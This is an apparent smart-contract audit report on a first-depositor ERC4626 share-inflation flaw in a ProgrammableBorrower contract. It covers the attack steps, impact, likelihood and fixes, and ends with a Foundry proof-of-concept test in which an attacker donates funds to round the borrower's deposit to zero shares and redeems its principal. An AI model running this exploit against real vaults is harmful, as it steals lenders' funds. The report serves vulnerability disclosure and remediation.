### Title
First ERC4626 depositor can steal programmable-borrower principal through share inflation - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary

`ProgrammableBorrower` deposits lender funds into a configurable ERC4626 vault without enforcing a minimum share amount or otherwise protecting the vault’s first-deposit exchange rate. If the configured vault is empty or nearly empty, an unprivileged vault user can mint the first share, donate a large underlying balance to inflate its redemption value, and cause the borrower’s subsequent deposit to mint zero shares. The attacker then redeems the sole share and receives both the donation and the borrower’s deposited principal. [1](#0-0) 

### Finding Description

`deployRevolvingCreditVault` configures an arbitrary ERC4626 vault for the programmable borrower. [2](#0-1) 

During `startEpoch`, the credit vault transfers idle lender funds to `ProgrammableBorrower`, and `onStartEpoch` deposits the borrower contract’s full underlying balance into that vault. [3](#0-2) [4](#0-3) 

The deposit path accepts whatever share amount the external vault returns and does not enforce `shares > 0` or a minimum acceptable exchange rate. [1](#0-0) 

For a standard empty ERC4626 vault, an attacker can deposit one underlying unit to receive the first share and directly transfer a large donation to the vault. Once `totalAssets` greatly exceeds the borrower deposit, the borrower’s `vault.deposit(amount, address(this))` rounds its share entitlement down to zero while still transferring `amount` into the vault. The attacker, still holding the only share, redeems all vault assets and takes the borrower deposit.

The borrower accounting subsequently derives its vault position from its share balance, so a zero-share deposit is valued as zero. [5](#0-4) 

The epoch baseline was snapshotted from the pre-deposit cash amount, so the inflated vault deposit is not classified as principal added during the epoch; the entire position becomes an unrecoverable vault loss. [6](#0-5) [7](#0-6) 

### Impact Explanation

An unprivileged ERC4626 vault user can steal lender principal routed through the programmable borrower.

For example, assume the credit vault sends `10,000 USDC` to `ProgrammableBorrower` at epoch start:

1. The attacker deposits `1 wei` into the empty configured ERC4626 vault and receives `1` share.
2. The attacker donates `20,000 USDC` directly to that vault.
3. `onStartEpoch` deposits the borrower’s `10,000 USDC`.
4. With an exchange rate exceeding `10,000 USDC` per share, the borrower receives zero shares.
5. The attacker redeems the sole vault share for approximately `30,000 USDC`, recovering the `20,000 USDC` donation and stealing the full `10,000 USDC` deposit.

The loss is crystallized as vault PnL rather than as principal still held by the vault. At a close-pool stop, `onStopEpoch` cannot recall the missing assets and returns success when the shortfall exceeds the zero-valued vault position, after which `getFundsFromBorrower` fails and the credit vault enters the borrower-default path. [8](#0-7) [9](#0-8) 

### Likelihood Explanation

The attack requires the configured ERC4626 vault to have an empty or sufficiently small share supply when the first borrower deposit occurs. This is realistic for a newly deployed revolving-credit facility whose parking vault has not yet been seeded, particularly when the vault address is publicly known before `startEpoch`.

No privileged role is required. The attacker only needs to make ordinary deposits, donations, and redemptions in the configured ERC4626 vault. The honest manager then calls `startEpoch`; all subsequent loss and default behavior follows automatically.

### Recommendation

Require a minimum share amount from `vault.deposit`, preferably computed with `previewDeposit` and an operator-configured slippage bound, and revert when the received shares are zero or below the bound.

Additionally, ensure the configured vault has a non-manipulable exchange rate before enabling the programmable borrower, such as by permanently locking initial liquidity in the vault or requiring an already-initialized vault with sufficient supply.

For defense in depth, record the vault share balance immediately before and after `_depositToVault` and revert unless the share increase represents approximately the deposited assets at the pre-deposit exchange rate.

contract Asset is ERC20 {
    constructor() ERC20("USD Coin", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract InflatableVault is ERC20 {
    IERC20 public immutable assetToken;

    constructor(IERC20 asset_) ERC20("Vault Share", "vSHARE") {
        assetToken = asset_;
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        uint256 supply = totalSupply();
        shares = supply == 0 ? assets : assets * supply / totalAssets();
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(
        uint256 shares,
        address receiver,
        address owner
    ) external returns (uint256 assets) {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function balanceOf(address account) public view override returns (uint256) {
        return ERC20.balanceOf(account);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        shares = supply == 0 ? assets : assets * supply / totalAssets();
        if (shares * totalAssets() < assets * supply) shares++;
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract DummyCDO {
    Asset public immutable asset;
    ProgrammableBorrower public borrowerAdapter;

    constructor(Asset asset_) {
        asset = asset_;
    }

    function setBorrowerAdapter(ProgrammableBorrower adapter) external {
        borrowerAdapter = adapter;
    }

    function token() external view returns (address) {
        return address(asset);
    }

    function startEpoch(uint256 amount) external {
        asset.transfer(address(borrowerAdapter), amount);
        borrowerAdapter.onStartEpoch(0);
    }
}

contract ProgrammableBorrowerInflationTest is Test {
    Asset asset;
    InflatableVault vault;
    DummyCDO cdo;
    ProgrammableBorrower adapter;

    address attacker = makeAddr("attacker");
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");

    uint256 constant DONATION = 20_000e6;
    uint256 constant EPOCH_PRINCIPAL = 10_000e6;

    function setUp() external {
        asset = new Asset();
        vault = new InflatableVault(IERC20(address(asset)));
        cdo = new DummyCDO(asset);

        adapter = new ProgrammableBorrower();
        adapter.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            borrower,
            0
        );
        cdo.setBorrowerAdapter(adapter);

        asset.mint(attacker, DONATION + 1);
        asset.mint(address(cdo), EPOCH_PRINCIPAL);
    }

    function testFirstDepositorStealsEpochPrincipal() external {
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), DONATION);
        vm.stopPrank();

        cdo.startEpoch(EPOCH_PRINCIPAL);

        assertEq(vault.balanceOf(address(adapter)), 0);
        assertEq(adapter.totalUnderlying(), 0);

        uint256 attackerBefore = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(asset.balanceOf(attacker) - attackerBefore, DONATION + EPOCH_PRINCIPAL + 1);
        assertEq(adapter.totalUnderlying(), 0);
    }
}
